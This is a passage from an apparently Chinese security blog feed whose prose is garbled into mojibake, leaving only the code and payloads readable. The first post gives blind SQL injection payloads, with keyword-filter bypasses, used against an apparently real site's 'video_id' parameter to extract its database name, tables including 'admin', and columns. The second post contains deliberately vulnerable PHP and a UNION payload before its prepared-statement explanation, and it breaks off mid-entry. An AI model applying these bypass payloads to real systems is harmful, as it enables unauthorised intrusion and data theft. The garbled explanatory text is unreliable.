src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/10.png"></p><p>å¼€å§‹çˆ†æ•°æ®åº“åï¼Œè¿™é‡Œå…ˆå°è¯•ä¸€ä¸‹èƒ½å¦ä½¿ç”¨å¼•å·ï¼š<code>video_id=0 or (case when length(&#39;123&#39;)=3 then 1 else 0 end)</code></p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/11.png"></p><p>ç®—äº†ï¼Œè¿˜æ˜¯ä¸ç”¨å¼•å·äº†å§ï¼Œç”¨<code>ascii()</code>è¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯è¦è®°ä½çš„æ˜¯è¿™é‡Œä¸èƒ½ä½¿ç”¨é€—å·ï¼Œå¼•å·</p><p>è€Œåˆšå¥½<code>substring()</code>æœ‰ä¸€ç§ä¸ç”¨å¼•å·çš„å½¢å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">substring(string from position for length)<br># å‚æ•°stringæŒ‡çš„æ˜¯éœ€è¦æˆªå–çš„åŸå­—ç¬¦ä¸²<br># æ•°positionæŒ‡çš„æ˜¯ä»å“ªä¸ªä½ç½®å¼€å§‹æˆªå–å­å­—ç¬¦ä¸²,è‹¥positionä¸ºè´Ÿæ•°åˆ™ä»å³å¾€å·¦å¼€å§‹æ•°ä½ç½®ã€‚<br># å‚æ•°lengthæŒ‡çš„æ˜¯éœ€è¦æˆªå–çš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œå¦‚æœä¸å†™ï¼Œåˆ™é»˜è®¤æˆªå–ä»positionå¼€å§‹åˆ°æœ€åä¸€ä½çš„æ‰€æœ‰å­—ç¬¦ã€‚<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯ä¸€ä½ä¸€ä½åˆ¤æ–­çš„ï¼Œæ‰€ä»¥å¯ä»¥å¿½ç•¥forï¼Œæ„é€ payloadå¦‚ä¸‹</p><p><code>video_id=0 or (case when ascii(substring(datababasese() from -1))=121 then 1 else 0 end)</code></p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/12.png"></p><p>æˆåŠŸè·å–åˆ°æ•°æ®åº“åçš„æœ€åä¸€ä½æ˜¯<strong>y</strong>ï¼Œç„¶åå°±ä¸€æ­¥æ­¥è·å–å°±å¯ä»¥äº†ï¼Œæœ€ç»ˆå¾—åˆ°æ•°æ®åº“åä¸ºï¼š<strong>news_wsy</strong>ï¼Œä¸ä¸Šé¢çœ‹åˆ°çš„ä¸€æ ·</p><p>æ¥ä¸‹æ¥å°±æ˜¯è·å–è¡¨åäº†ï¼Œæ­£å¸¸æƒ…å†µä¸‹ç›´æ¥æŠŠ<code>datababasese()</code>æ¢æˆ<code>(select table_name from information_schema.tables where table_schema=&quot;æ•°æ®åº“å&quot;)</code>å°±å¯ä»¥äº†ï¼Œä½†è¿™é‡Œè‚¯å®šä¸æ­£å¸¸0.0</p><p>ä¸èƒ½æœ‰å¼•å·ï¼šæ‰€ä»¥å¯ä»¥åˆ©ç”¨MySQLçš„ç‰¹æ€§å°†åº“åä½ç½®æ›´æ”¹ä¸º16è¿›åˆ¶å½¢å¼ï¼š0x6E6577735F777379</p><p><code>video_id=0 or not (case when substring((select table_name from information_schema.tables where table_schema=0x6E6577735F777379)from 1 for 1)=0x61 then 1 else0 end)</code>,å°è¯•ä¸€ä¸‹è¿™ä¸ªpayload</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/13.png"></p><p>GG,ç›´æ¥å‚æ•°ä¸åˆæ³•ï¼Œå‚æ•°ä¸åˆæ³•ï¼Œé‚£æµ‹ä¸€ä¸‹å“ªäº›å‚æ•°ä¸åˆæ³•</p><p>å…ˆè¯•ä¸€ä¸‹selectåˆä¸åˆæ³•ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯å¾ˆå¤šè¿‡æ»¤è§„åˆ™ä¸­éƒ½ä¼šç¦ç”¨çš„</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/14.png"></p><p>æœç„¶ä¸åˆæ³•ï¼Œåƒè¿™ç§å…³é”®å­—ä¸€èˆ¬å¯ä»¥ä½¿ç”¨å†…è”æ³¨é‡Šã€å…³é”®å­—æ›¿ä»£ã€å¤§å°å†™ç­‰ç»•è¿‡æ–¹å¼ï¼Œä½†è¿™é‡Œï¼Œè¿˜å¯ä»¥ä½¿ç”¨é€—å·ï¼Œåœ¨å‰é¢çš„ç»•è¿‡ä¸­å‘ç°é€—å·æ˜¯ä¼šè¢«è¿‡æ»¤æ‰çš„ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥å°è¯•ä¸€ä¸‹åœ¨selectä¸­åŠ ä¸ªé€—å·ï¼Œå¦‚æœæœåŠ¡ç«¯æ˜¯å…ˆè¿›è¡Œselectçš„æ£€éªŒï¼Œå†åˆ é™¤é€—å·ï¼Œé‚£ä¹ˆè¿™é‡Œå°±æ˜¯å¯ä»¥è¡Œçš„ï¼Œå°è¯•ä¹‹åï¼Œå‘ç°èƒ½å¤ŸæˆåŠŸè¿‡æ¥</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/15.png"></p><p>ç„¶åç»§ç»­å¾€ä¸‹å°è¯•ï¼Œä¸€ä¸ªå•è¯ä¸€ä¸ªå•è¯çš„è¿›è¡Œï¼Œçœ‹çœ‹æœåŠ¡ç«¯è¿˜æ£€æµ‹äº†å“ªäº›ï¼Œ</p><p>å†™åˆ°<code>video_id=0 or not (case when substring((sel,ect table_name from information_schema.tables)from 1 for 1)=0x61 then 1 else 0 end)</code>è¿™é‡Œæ—¶å‘ç°åˆä¸è¡Œäº†ï¼Œåˆæç¤ºå‚æ•°ä¸åˆæ³•äº†</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/16.png"></p><p>é‚£åŸºæœ¬ä¸Šå°±æ˜¯<code>information_schema.tables</code>çš„é—®é¢˜ï¼Œç»æµ‹è¯•<code>information_schema</code>å’Œ<code>tables</code>å•ç‹¬å­˜åœ¨æ—¶éƒ½æ²¡æœ‰é—®é¢˜ï¼Œé‚£ä¹ˆä¸€å®šæ˜¯<code>information_schema.tables</code>åŒæ—¶å­˜åœ¨ä¼šè¢«è§„åˆ™åŒ¹é…åˆ°ï¼Œé‚£ä¹ˆè¿™é‡Œå¯ä»¥æ›´æ”¹æˆ<code>informa,tion_sch,ema.tab,les</code>æˆ–è€…<code>information_schema . tables</code>(è¿™ç§å½¢å¼æ˜¯åœ¨MySQLå‘½ä»¤è¡Œä¸­æµ‹è¯•å‘ç°)ï¼Œå°†payloadæ›´æ”¹ä¸ºå¦‚ä¸‹å½¢å¼ï¼š</p><p><code>video_id=0 or not (case when substring((sel,ect group_concat(table_name)from information_schema . tables where table_schema=0x6E6577735F777379)from 1 for 1)=0x61 then 1 else 0 end)</code></p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/17.png"></p><p>æˆåŠŸï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç¹ççš„çˆ†è¡¨ï¼Œè¿™é‡Œè·å–äº†å‰å››ä¸ªè¡¨çš„ï¼šaddgunang,admin,announcement_listï¼Œè·å–è¡¨ä¹‹åå°±æ˜¯çˆ†å­—æ®µäº†ï¼Œè¿™é‡Œè·Ÿçˆ†è¡¨æ²¡æœ‰å¤ªå¤šåŒºåˆ«ï¼Œæ‰€ä»¥ç›´æ¥é™„ä¸Špayload:</p><p><code>video_id=0 or not(case when substring((sel,ect group_concat(column_name)from(information_schema . columns)where table_name=0x61646D696E)from 1 for 1)=0x61 then 1 else 0 end)</code></p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/18.png"></p><p>æˆåŠŸï¼Œè·å–æ•°æ®å¤„åŸºæœ¬ä¸Šå°±æ²¡æœ‰ä»€ä¹ˆç»•è¿‡çš„å†…å®¹äº†ï¼Œæ‰€ä»¥å†™åˆ°è¿™é‡Œå°±å·®ä¸å¤šäº†</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>å…¶å®è¿™ä¸ªæ³¨å…¥ç‚¹æ˜¯å¾ˆç®€å•çš„ï¼Œå°¤å…¶æ˜¯åœ¨å‘ç°æœåŠ¡ç«¯å°†é€—å·è¿‡æ»¤æ‰ä¹‹åï¼Œå¹¶ä¸”è¿™ä¸ªè¿‡æ»¤é€—å·æ˜¯åœ¨æ£€æµ‹ä¹‹åè¿›è¡Œçš„ï¼Œå‘ç°è¿™ä¸ªä¹‹åï¼Œåé¢æ³¨å…¥åŸºæœ¬ä¸Šæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œé‡åˆ°å…³é”®å­—æ£€æµ‹å°±åœ¨å…³é”®å­—ä¸­åŠ ä¸ªé€—å·ï¼Œè¿™æ ·å°±èƒ½ç»•è¿‡æ£€æµ‹ï¼›å¦å¤–å°±æ˜¯MySQLä¸­ä¸€äº›å¯ä»¥ç›¸äº’æ›¿æ¢çš„å‡½æ•°ï¼ŒåŠ›æ¨MySQLæ‰‹å†Œï¼Œçœ‹çœ‹è¿™ä¸ªæ‰¾ä¸€æ‰¾ï¼Œæœ‰æ—¶å€™æ‰¾å®˜æ–¹æ–‡æ¡£æ¯”ç™¾åº¦çš„å¿«ï¼ŒåŸºæœ¬ä¸Šå°±è¿™ä¸ªæ ·å­äº†ã€‚å¦å¤–æ–‡ç« ä¸­æœ‰ä¸€äº›Payloadæ˜¯ç›´æ¥å¤åˆ¶çš„ä»¥å‰æ³¨å…¥æ—¶ç•™ä¸‹çš„è®°å½•ï¼Œæ‰€ä»¥å¯èƒ½æœ‰æ—¶å€™æ˜¯<code>0 or (xxx)</code>ï¼Œæœ‰æ—¶å€™æ˜¯<code>0 or not(xxx)</code>ï¼Œä¸è¿‡è¿™äº›éƒ½å·®ä¸å¤šï¼Œæ²¡å¤šå¤§å½±å“ã€‚è¿™ä¸ªä½ç½®ä¸ªäººæ„Ÿè§‰å¯¹ç»ƒä¹ ç»•è¿‡æ€è·¯æœ‰ä¸€å®šå¸®åŠ©ï¼Œæ‰€ä»¥è®°å½•ä¸‹æ¥ã€‚ççˆ±ç”Ÿå‘½ï¼Œä¸è¦æ‰’æ‹‰æ•°æ®ï¼ŒéªŒè¯å­˜åœ¨å°±å¥½ã€‚</p><p>æœ€åï¼Œè¯¥å»å¹²æ­£äº‹äº†</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/19.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>ç”¨æ¥æ¶å¿ƒäººçš„</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLæ³¨å…¥&amp;é¢„ç¼–è¯‘</title>
    <link href="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&amp;%E9%A2%84%E7%BC%96%E8%AF%91/"/>
    <url>/2022/02/05/SQL%E6%B3%A8%E5%85%A5&amp;%E9%A2%84%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h2 id="SQLæ³¨å…¥-amp-é¢„ç¼–è¯‘"><a href="#SQLæ³¨å…¥-amp-é¢„ç¼–è¯‘" class="headerlink" title="SQLæ³¨å…¥&amp;é¢„ç¼–è¯‘"></a>SQLæ³¨å…¥&amp;é¢„ç¼–è¯‘</h2><p>è¿™ç¯‡æ–‡ç« æ¥æºäºè¢«é¢„ç¼–è¯‘æçš„å¤´ç–¼ï¼Œæ¡åƒåœ¾çš„æˆ‘åªæ˜¯æƒ³æ¡ä¸ªæ³¨å…¥ï¼Œç„¶é¹…éšç€ä½¿ç”¨é¢„ç¼–è¯‘çš„å¹¿æ³›ä½¿ç”¨ï¼Œè®©æˆ‘è¿™ä¸ªæ¡åƒåœ¾çš„æ¡ä¸åˆ°æ³¨å…¥äº†ã€‚ä½†å¬è¯´é¢„ç¼–è¯‘é˜²æ­¢ä¸äº†æ’åºå¤„çš„æ³¨å…¥ï¼Œäºæ˜¯ä¹æƒ³è‡ªå·±çœ‹ä¸€ä¸‹ï¼Œç„¶åå°±åˆèƒ½å¤šä¸ªæ¡åƒåœ¾çš„è·¯å­äº†ã€‚å¤šæ¡ç‚¹åƒåœ¾çš„è¯æ™šä¸Šå°±èƒ½åŠ ä¸ªè›‹äº†Q_A_Q</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/1.png"></p><h3 id="æ‹¼æ¥"><a href="#æ‹¼æ¥" class="headerlink" title="æ‹¼æ¥"></a>æ‹¼æ¥</h3><p>å¾ˆä¹…å¾ˆä¹…ä»¥å‰ï¼Œç”¨æˆ·çš„ä¼ å‚æ˜¯èƒ½å¤Ÿç›´æ¥æ‹¼æ¥åˆ°sqlçš„æŸ¥è¯¢è¯­å¥ä¸­å»ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">// index.php<br>&lt;?php<br>$username = $_POST[&#x27;username&#x27;];<br>mysqli_select_db($conn,sort) or die ( &quot;Unable to connect to the database: test&quot;);<br># é€‰æ‹©æ•°æ®åº“<br><br>$sql = &quot;select fraction from fraction where name = &#x27;$username&#x27;;&quot;;# ç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ‹¼æ¥è¿›å­—ç¬¦ä¸²<br>$result = mysqli_query($conn,$sql);<br>echo &#x27;&lt;br/&gt;&#x27;.$sql.&#x27;&lt;br/&gt;&#x27;;# æ‰“å°sqlè¯­å¥<br><br>if($fraction = mysqli_fetch_assoc( $result ))&#123;<br>    echo &#x27;æŸ¥è¯¢æˆåŠŸ&#x27;;<br>&#125;<br>else&#123;<br>    mysqli_error($conn);<br>&#125;<br><br>echo &#x27;&lt;br/&gt;&#x27;;<br>echo &#x27;å­¦ç”Ÿ:&#x27;.$username;<br>echo &#x27;&lt;br/&gt;&#x27;;<br>echo &#x27;åˆ†æ•°:&#x27;.$fraction[&#x27;fraction&#x27;];<br><br>$conn-&gt;close();<br>?&gt;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ„å»ºäº†ä¸€ä¸ªç®€å•çš„æŸ¥è¯¢åˆ†æ•°çš„åŠŸèƒ½ï¼Œå¯ä»¥çœ‹åˆ°ç›´æ¥å°†ç”¨æˆ·çš„è¾“å…¥å¸¦å…¥åˆ°äº†sqlè¯­å¥ä¸­ï¼Œè¿™sqlæ³¨å…¥å¾ˆæ˜æ˜¾äº†</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/2.png" alt="åˆ†æ•°è¡¨"></p><p>è¿™é‡Œå¯ä»¥ç›´æ¥æ„é€ payloadæ¥å®ç°æ³¨å…¥</p><p>payload:<code>1&#39;union select database();#</code></p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/3.png"></p><p>è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœåšå®‰å…¨é˜²æŠ¤çš„è¯ï¼Œä¹Ÿåªèƒ½æ˜¯ä»æ•ˆéªŒç”¨æˆ·çš„è¾“å…¥å…¥æ‰‹äº†ï¼Œä½†æ˜¯æ•ˆéªŒè§„åˆ™å¤§æ¦‚ç‡éƒ½èƒ½è¿›è¡Œç»•è¿‡ï¼Œåªä¸è¿‡æ˜¯ç»•çš„éš¾æ˜“ä¸ä¸€æ ·ç½¢äº†ã€‚ä½†æ˜¯ç°åœ¨å·²ç»è¿›å…¥åˆ°äº†é¢„ç¼–è¯‘çš„æ—¶ä»£ï¼Œæ‹¼æ¥çš„æƒ…å†µè™½ç„¶æœ‰ï¼Œä½†è¾ƒå°‘äº†ï¼Œå†åŠ ä¸Šé˜²æŠ¤è®¾å¤‡çš„å¹¿æ³›åº”ç”¨ï¼Œ</p><h3 id="é¢„ç¼–è¯‘"><a href="#é¢„ç¼–è¯‘" class="headerlink" title="é¢„ç¼–è¯‘"></a>é¢„ç¼–è¯‘</h3><p>æ®å¬è¯´ï¼Œé¢„ç¼–è¯‘ä¸€å¼€å§‹æ˜¯ä¸ºäº†æé«˜MySQLçš„è¿è¡Œæ•ˆç‡è€Œè¯ç”Ÿï¼Œä½†æ˜¯ç”±äºå…¶å…ˆæ„å»ºè¯­æ³•æ ‘ï¼Œåå¸¦å…¥æŸ¥è¯¢å‚æ•°çš„ç‰¹æ€§å¯¼è‡´å…¶å…·æœ‰äº†é˜²æ­¢SQLæ³¨å…¥çš„ç‰¹æ€§ã€‚è¿™é‡Œç®€å•è¯´ä¸€ä¸‹MySQLçš„é¢„å¤„ç†è¯­å¥çš„ä½¿ç”¨ï¼Œä»¥åŠé˜²æ­¢SQLçš„æ³¨å…¥çš„åŸå› (å› ä¸ºå…¶ä»–æ•°æ®åº“ä¸€ç‚¹ä¸ä¼š)</p><h4 id="MySQLé¢„ç¼–è¯‘"><a href="#MySQLé¢„ç¼–è¯‘" class="headerlink" title="MySQLé¢„ç¼–è¯‘"></a>MySQLé¢„ç¼–è¯‘</h4><p>MySQLé¢„ç¼–è¯‘æ‰§è¡Œåˆ†ä¸ºä¸‰æ­¥ï¼š</p><p>1.æ‰§è¡Œé¢„ç¼–è¯‘è¯­å¥ï¼Œæ„å»ºè¯­æ³•æ ‘ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare sel from &quot;select fraction from fraction where name = ?&quot;;<br># ä½¿ç”¨PREPARE stmt_name FROM preparable_stmè¯­æ³•<br># stmt_nameæ˜¯è¯­å¥åï¼Œpreparable_stmæ˜¯å…·ä½“è¦æ‰§è¡Œçš„è¯­å¥ï¼Œå˜é‡å…ˆç”± ï¼Ÿ è¿›è¡Œå ä½<br></code></pre></td></tr></table></figure><p>2.è®¾ç½®å˜é‡ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @a=&#x27;mechoy&#x27;;<br></code></pre></td></tr></table></figure><p>3.æ‰§è¡Œï¼Œå°†è®¾ç½®çš„å˜é‡ä»£å…¥åˆ°å·²ç»æ„å»ºå¥½çš„è¯­å¥ä¸­è¿›è¡Œæ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">execute sel using @a;<br># ä½¿ç”¨EXECUTE stmt_name [USING @var_name [, @var_name] ...]è¯­æ³•<br># å˜é‡ä½ç½®ä¸å ä½ç¬¦ä¸€ä¸€å¯¹åº”<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æŸåæŸ¥çœ‹æ•°æ®åº“æ—¥å¿—ï¼š</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/4.png"></p><p>å¯ä»¥çœ‹åˆ°åœ¨ä½¿ç”¨é¢„å¤„ç†è¯­å¥æ—¶ï¼Œæ•°æ®åº“å…±è¿›è¡Œäº†å››æ­¥æ“ä½œï¼š1.æ„å»ºé¢„å¤„ç†è¯­å¥ï¼›2.è®¾ç½®å˜é‡ï¼›3.ç»‘å®šå˜é‡ï¼›4.æ‰§è¡ŒæŸ¥è¯¢</p><p>é¢„ç¼–è¯‘çš„ä¼˜åŠ¿åœ¨äºå…¶ä¸ç”¨æ¯ä¸€æ¬¡éƒ½æ„å»ºè¯­æ³•æ ‘ï¼Œä»¥ä¸Šé¢ä¸ºä¾‹ï¼Œå½“æœ‰<code>@b=&#39;admin&#39;</code>æ—¶ï¼Œæ‰§è¡Œ<code>execute sel using @b;</code>æ—¶ï¼Œæ•°æ®åº“ä¼šç›´æ¥å»fractionè¡¨ä¸­æŸ¥è¯¢<code>name=admin</code>çš„fractionå€¼ï¼Œè€Œä¸ç”¨å†ä¸€æ¬¡æ„å»ºè¯­æ³•æ ‘ï¼Œè¿™å¯èƒ½ä¹Ÿå°±æ˜¯é¢„ç¼–è¯‘è¯­å¥ä¸ºä½•èƒ½æé«˜MySQLæ•ˆç‡çš„åŸå› </p><p>è€Œé¢„ç¼–è¯‘è¯­å¥åœ¨é˜²æ­¢SQLæ³¨å…¥ä¸Šï¼Œçœ‹ä¸‹é¢è¿™å¼ å›¾ï¼š</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/5.png"></p><p>åœ¨@bå’Œ@cçš„æƒ…å†µä¸‹è¿”å›éƒ½ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯å°†@bå’Œ@cçš„å€¼åªæ˜¯å½“åšä¸€ä¸ªå˜é‡ï¼Œå»å¯»æ‰¾nameå­—æ®µä¸­ä¸å…¶ç›¸åŒçš„</p><p>å¦‚æœåœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡<code>name=xx union select database()</code>æ•°æ®ï¼Œå†æ¬¡æ‰§è¡Œå°±ä¼šè·å¾—ç›¸åº”çš„å€¼</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/6.png"></p><p>å†æ‰§è¡Œå°±ä¼šå¾—åˆ°å¦‚ä¸‹ç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; execute sel using @c;<br>+----------+<br>| fraction |<br>+----------+<br>|      100 |<br>+----------+<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œå˜é‡åªæ˜¯ä¸€ä¸ªå˜é‡ï¼Œåªæ˜¯ç”¨æ¥æ¯”è¾ƒnameå­—æ®µä¸­æ˜¯å¦å­˜åœ¨ç›¸åŒçš„å€¼ï¼Œå­˜åœ¨åˆ™è¿”å›fractionçš„å€¼ï¼Œä¸å­˜åœ¨åˆ™è¿”å›ç©ºï¼Œè¿™å°±æ˜¯é¢„ç¼–è¯‘ä¸ºä»€ä¹ˆèƒ½é˜²æ­¢SQLæ³¨å…¥çš„åŸå› ã€‚</p><h4 id="PHP-MySQL-é¢„å¤„ç†è¯­å¥"><a href="#PHP-MySQL-é¢„å¤„ç†è¯­å¥" class="headerlink" title="PHP+MySQL é¢„å¤„ç†è¯­å¥"></a>PHP+MySQL é¢„å¤„ç†è¯­å¥</h4><p>åœ¨ä½¿ç”¨PHPç¼–å†™é¢„å¤„ç†è¯­å¥æ—¶ï¼Œä¼šé‡åˆ°é¢„ç¼–è¯‘å’Œæ¨¡æ‹Ÿé¢„ç¼–è¯‘(è¿™é‡Œå…ˆæä¸€ä¸‹)</p><p>PHPä¸­è¿æ¥MySQLæ•°æ®åº“ç›®å‰ä¸¤ç§è¾ƒä¸ºå¸¸è§çš„æ–¹æ³•ï¼š</p><ul><li>Mysqli</li><li>PDO</li></ul><p>è¿™é‡Œå…ˆè¯´ä¸€ä¸‹ä½¿ç”¨Mysqliçš„é¢„ç¼–è¯‘è¯­å¥è¿›è¡Œæ•°æ®çš„æŸ¥è¯¢</p><h5 id="Mysqli"><a href="#Mysqli" class="headerlink" title="Mysqli"></a>Mysqli</h5><p><code>Mysqli</code>æ‰©å±•å…è®¸æˆ‘ä»¬è®¿é—®MySQL 4.1åŠä»¥ä¸Šç‰ˆæœ¬æä¾›çš„åŠŸèƒ½ã€‚</p><p>ä½¿ç”¨PHPçš„Mysqliå®ç°é¢„ç¼–è¯‘å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"># index1.php<br># $connä¸ºä¸mysqlæ•°æ®åº“å»ºç«‹çš„é“¾æ¥ï¼ŒåŒæ—¶é€‰æ‹©<br>&lt;?php<br>$username = $_POST[&#x27;username&#x27;];<br><br># $stmt = $conn-&gt;prepare(&quot;select fraction from fraction where name = ?&quot;);   é¢„å¤„ç†ä»¥åŠç»‘å®š<br>$stmt = mysqli_stmt_init($conn);    # åˆ†é…å¹¶åˆå§‹åŒ–ä¸€ä¸ªè¯­å¥å¯¹è±¡ç”¨äºmysqli_stmt_prepare()ã€‚<br>mysqli_stmt_prepare($stmt,&quot;select fraction from fraction where name = ?&quot;);  # é¢„å¤„ç†<br>mysqli_stmt_bind_param($stmt,&quot;s&quot;, $username);   # ç»‘å®š<br><br># $stmt-&gt;execute();# æ‰§è¡Œ<br>mysqli_stmt_execute($stmt);<br>mysqli_stmt_bind_result($stmt,$fraction);   # å°†æŸ¥è¯¢ç»“æœç»‘å®šè‡³$fraction<br><br>if(mysqli_stmt_fetch($stmt))&#123;<br>    echo &#x27;æŸ¥è¯¢æˆåŠŸ&#x27;;<br>echo &#x27;&lt;br/&gt;&#x27;;<br>echo &#x27;å­¦ç”Ÿ:&#x27;.$username;<br>echo &#x27;&lt;br/&gt;&#x27;;<br># echo &#x27;åˆ†æ•°:&#x27;.$fraction;<br>print(&quot;åˆ†æ•°: &quot;.$fraction.&quot;\n&quot;);<br>&#125;<br>else&#123;<br>    mysqli_stmt_errno($stmt);<br>&#125;<br><br>$conn-&gt;close();<br>?&gt;<br></code></pre></td></tr></table></figure><p>æ‰§è¡ŒæŸ¥è¯¢<code>name=&quot;mechoy&quot;</code>ï¼ŒæŸ¥çœ‹æ•°æ®åº“æ—¥å¿—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Connectroot@localhost on sort using TCP/IP<br>Prepareselect fraction from fraction where name = ?<br>Executeselect fraction from fraction where name = &#x27;mechoy&#x27;<br># å¯ä»¥çœ‹åˆ°è¿™é‡Œå…±åˆ†æˆäº†ä¸‰æ­¥ï¼š1.å»ºç«‹è¿æ¥ï¼›2.æ„å»ºè¯­æ³•æ ‘ï¼›3.æ‰§è¡Œ<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçœ‹èµ·æ¥è·ŸMySQLçš„é¢„å¤„ç†è¯­å¥åŸºæœ¬ç›¸åŒï¼Œåªä¸è¿‡å› ä¸ºè¿™é‡Œå°‘äº†è®¾ç½®å˜é‡å’Œå°†å˜é‡ç»‘å®šè¿›é¢„ç¼–è¯‘çš„ä¸¤æ­¥ã€‚</p><p>æ‰§è¡ŒæŸ¥è¯¢<code>name=&quot;mechoy&#39; union select database();#&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">4 Connectroot@localhost on sort using TCP/IP<br>4 Prepareselect fraction from fraction where name = ?<br>4 Executeselect fraction from fraction where name = &#x27;mechoy\&#x27; union select database();#&#x27;<br></code></pre></td></tr></table></figure><p>å‘ç°è¿™é‡Œè¾“å…¥çš„å•å¼•å·è¢«è½¬ä¹‰äº†ï¼Œé¢„ç¼–è¯‘+è½¬ä¹‰ï¼Œå¥½åƒè·ŸSQLæ³¨å…¥è¯´å†è§äº†ï¼Œå¯¹äºæˆ‘è¿™ä¸ªåªä¼šSqlmapä¸€æŠŠæ¢­çš„äººï¼Œå¥½åƒè·Ÿå…¨ä¸–ç•Œå†è§äº†</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/8.png"></p><h5 id="PDO"><a href="#PDO" class="headerlink" 